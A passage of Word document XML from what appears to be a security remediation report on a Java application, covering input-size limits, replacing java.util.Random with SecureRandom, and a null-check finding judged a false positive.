    <w:p w14:paraId="7D853070" w14:textId="49D46ACA" w:rsidR="00292E5C" w:rsidRPr="0052613E" w:rsidRDefault="00292E5C" w:rsidP="0052613E">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">In every strategy processing files or concatenating strings based on external input (e.g. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>readFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>getResourceFiles</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> in RestImportService.java, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>readTextFromFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>buildPath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> in FileUtilities.java, or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>createURI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> in RestUtilities.java), StringBuilder is currently initialised with a large default capacity, e.g. 10 MB, or calculated from the input length. This shortcut prevents continuous reallocations during reading and keeps memory utilisation within limits, even with larger-than-expected input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B2FD8F" w14:textId="599B5637" w:rsidR="00292E5C" w:rsidRPr="0052613E" w:rsidRDefault="00292E5C" w:rsidP="0052613E">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Alongside buffer optimisation, strict restrictions are imposed on what and how much the system can read. A limit is set on the length of each line (e.g. 4,096 characters) and on the total size of data processed (e.g. 10 MB). When either of these limits is reached, the system stops reading and reports an error, thereby preventing the processing of unduly heavy files or resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300585E9" w14:textId="0F06F9E8" w:rsidR="00292E5C" w:rsidRPr="0052613E" w:rsidRDefault="00292E5C" w:rsidP="0052613E">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0052613E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>All input streams are now processed using the 'try-with-resources' statement, which closes resources automatically even if an error occurs. This prevents memory leaks caused by open streams.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EEEF69D" w14:textId="77777777" w:rsidR="00292E5C" w:rsidRPr="00292E5C" w:rsidRDefault="00292E5C" w:rsidP="00292E5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292E5C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>As a result of these changes, the system can safely handle input from external sources, avoiding issues such as uncontrolled reallocation and memory overloading, while ensuring that resources are always closed. The system's general behaviour is now more stable, predictable and resistant to abuse, even when input could be manipulated with malicious intent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238601FE" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10B75DBC" w14:textId="01147446" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="124" w:name="_Hlk199870990"/>
      <w:bookmarkStart w:id="125" w:name="_Toc200039314"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Insecure Randomness</w:t>
      </w:r>
      <w:bookmarkEnd w:id="124"/>
      <w:bookmarkEnd w:id="125"/>
    </w:p>
    <w:p w14:paraId="1CB9C9BD" w14:textId="526F9825" w:rsidR="00762BB7" w:rsidRPr="00762BB7" w:rsidRDefault="00762BB7" w:rsidP="00762BB7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">The error is caused by using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>java.util</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>.Random</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> class to generate pseudo-random numbers</w:t>
      </w:r>
      <w:r w:rsidR="003E3349">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00E33216">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00E33216">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199871033 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00E33216">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00E33216">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00E33216">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="003E3349">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. This implementation is not suitable for contexts where safety is required, since the generator is deterministic and relies on an initial seed, </w:t>
      </w:r>
      <w:r w:rsidR="00BD7EFB">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>always</w:t>
      </w:r>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> derived from the system time in milliseconds. This makes the generated values potentially predictable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1B48A4" w14:textId="1E2CB410" w:rsidR="00762BB7" w:rsidRDefault="00762BB7" w:rsidP="00762BB7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">To address this vulnerability, the Java Random class was replaced with the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>SecureRandom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> class</w:t>
      </w:r>
      <w:r w:rsidR="00D53FEB">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00D53FEB">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00D53FEB">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199872311 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00D53FEB">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00D53FEB">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D53FEB">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00D53FEB">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00762BB7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>, which uses cryptographically secure entropy sources provided by the operating system. This makes the generation of numbers unpredictable and suitable for contexts where the security and unpredictability of the generated values must be ensured.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3CABC7" w14:textId="5882C70E" w:rsidR="00910649" w:rsidRDefault="008E38C4" w:rsidP="003E3349">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E38C4">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="643FECC6" wp14:editId="593ED778">
            <wp:extent cx="4543425" cy="1797580"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="221402438"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402438" name="Picture 1" descr="A screen shot of a computer code&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId41"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4547630" cy="1799243"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="792AC409" w14:textId="26E68AA4" w:rsidR="00366B51" w:rsidRDefault="00366B51" w:rsidP="003E3349">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00366B51">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75618393" wp14:editId="538E9CEE">
            <wp:extent cx="4629150" cy="1880063"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="39001796" name="Picture 1" descr="A computer code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01796" name="Picture 1" descr="A computer code on a black background&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId42"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4639622" cy="1884316"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="493F87CE" w14:textId="71FC4B2E" w:rsidR="00BC4A6B" w:rsidRDefault="00BC4A6B" w:rsidP="003E3349">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC4A6B">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76DD0A5C" wp14:editId="4B569385">
            <wp:extent cx="4657725" cy="465308"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1016724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724331" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId43"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4748370" cy="474363"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="51429E26" w14:textId="77777777" w:rsidR="00E33216" w:rsidRDefault="003E3349" w:rsidP="00E33216">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="003E3349">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3EA2AA67" wp14:editId="6286DCAE">
            <wp:extent cx="4638675" cy="491148"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="951535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535835" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId44"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4687202" cy="496286"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6000825B" w14:textId="3A25EBB1" w:rsidR="003E3349" w:rsidRDefault="00E33216" w:rsidP="00E33216">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="126" w:name="_Ref199871033"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>29</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="126"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00780275">
        <w:t>Insecure Randomness</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1D3931" w14:textId="77777777" w:rsidR="00A92AD0" w:rsidRPr="00A92AD0" w:rsidRDefault="00A92AD0" w:rsidP="00A92AD0">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71CE4530" w14:textId="4749D918" w:rsidR="00E33216" w:rsidRDefault="007C4A14" w:rsidP="00A92AD0">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C4A14">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="771A5917" wp14:editId="45E0C397">
            <wp:extent cx="4669259" cy="1638300"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="306842437"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842437" name="Picture 1" descr="A screen shot of a computer code&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId45"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4685006" cy="1643825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="484A81F4" w14:textId="77109083" w:rsidR="00E16334" w:rsidRDefault="00E16334" w:rsidP="00A92AD0">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E16334">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5184DE3C" wp14:editId="1EC5B4D2">
            <wp:extent cx="4429125" cy="2036250"/>
            <wp:effectExtent l="0" t="0" r="0" b="2540"/>
            <wp:docPr id="1469695784"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695784" name="Picture 1" descr="A screen shot of a computer code&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId46"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4434871" cy="2038892"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="463CD28C" w14:textId="525D5401" w:rsidR="007D0544" w:rsidRDefault="007D0544" w:rsidP="00A92AD0">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007D0544">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="616C9C54" wp14:editId="2B9DB34C">
            <wp:extent cx="4457700" cy="417184"/>
            <wp:effectExtent l="0" t="0" r="0" b="2540"/>
            <wp:docPr id="2105374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374058" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId47"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4625131" cy="432853"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55834927" w14:textId="77777777" w:rsidR="00A92AD0" w:rsidRDefault="00A92AD0" w:rsidP="00A92AD0">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00A92AD0">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2534599E" wp14:editId="5608DADA">
            <wp:extent cx="4533900" cy="431346"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="612463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463625" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId48"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4659686" cy="443313"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7914E8E3" w14:textId="27F01E0F" w:rsidR="00A92AD0" w:rsidRDefault="00A92AD0" w:rsidP="00A92AD0">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="127" w:name="_Ref199872311"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>30</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="127"/>
      <w:r>
        <w:t>: Mitigation Insecure Randomness</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286A53EE" w14:textId="2D710771" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="128" w:name="_Toc200039315"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Missing Check against Null</w:t>
      </w:r>
      <w:bookmarkEnd w:id="128"/>
    </w:p>
    <w:p w14:paraId="1838533A" w14:textId="22086EA8" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The error relates to the fact that the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>getProperty</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> function does not check for Null values (</w:t>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859981 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859959 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). The function returns the path to the current working folder of the Java application (i.e. the folder from which the JVM process was started), so it cannot be Null. Therefore, this is a </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>false positive</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54BEAEDE" w14:textId="77777777" w:rsidR="00D303B9" w:rsidRDefault="00D303B9" w:rsidP="00D303B9">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="73D4B928" wp14:editId="42D03994">
            <wp:extent cx="5731200" cy="190500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="37"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49"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="190500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
